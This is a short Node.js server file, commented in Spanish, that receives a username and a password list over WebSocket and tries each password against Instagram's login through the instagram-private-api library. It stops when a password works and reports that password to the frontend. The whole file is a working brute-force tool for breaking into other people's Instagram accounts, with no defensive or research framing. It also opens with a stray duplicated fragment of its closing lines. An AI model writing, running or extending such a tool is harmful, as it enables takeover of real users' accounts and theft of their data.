n http://localhost:${PORT}`);
});const WebSocket = require('ws');
const express = require('express');
const { IgApiClient } = require('instagram-private-api');
require('dotenv').config();

// Configuración del servidor HTTP y WebSocket
const app = express();
const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });

// Servir el frontend
app.use(express.static('public'));

// Función para probar una contraseña
async function testPassword(username, password) {
  const ig = new IgApiClient();
  try {
    ig.state.generateDevice(username);
    await ig.account.login(username, password);
    return { success: true, password };
  } catch (error) {
    // Detectar si se requiere un código de 6 dígitos
    if (error.message.includes('two_factor_required')) {
      return { success: false, password, message: 'Se requiere un código de 6 dígitos para la verificación.' };
    }
    return { success: false, password, message: error.message };
  }
}

// Manejo de conexiones WebSocket
wss.on('connection', (ws) => {
  console.log('New client connected');

  ws.on('message', async (message) => {
    const data = JSON.parse(message);

    if (data.type === 'startLogin') {
      const { username, passwords } = data;
      let correctPassword = null;

      // Probar cada contraseña línea por línea
      for (const password of passwords) {
        const result = await testPassword(username, password);

        // Enviar el resultado al frontend
        ws.send(JSON.stringify(result));

        // Si la contraseña es correcta, guardarla y detener el proceso
        if (result.success) {
          correctPassword = result.password;
          break;
        }
      }

      // Enviar el resultado final al frontend
      if (correctPassword) {
        ws.send(JSON.stringify({
          type: 'finished',
          success: true,
          message: `¡Contraseña correcta encontrada: ${correctPassword}`,
        }));
      } else {
        ws.send(JSON.stringify({
          type: 'finished',
          success: false,
          message: 'Ninguna contraseña fue correcta.',
        }));
      }
    }
  });

  ws.on('close', () => {
    console.log('Client disconnected');
  });
});

// Iniciar el servidor
const PORT = process.env.PORT || 8080;
server.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
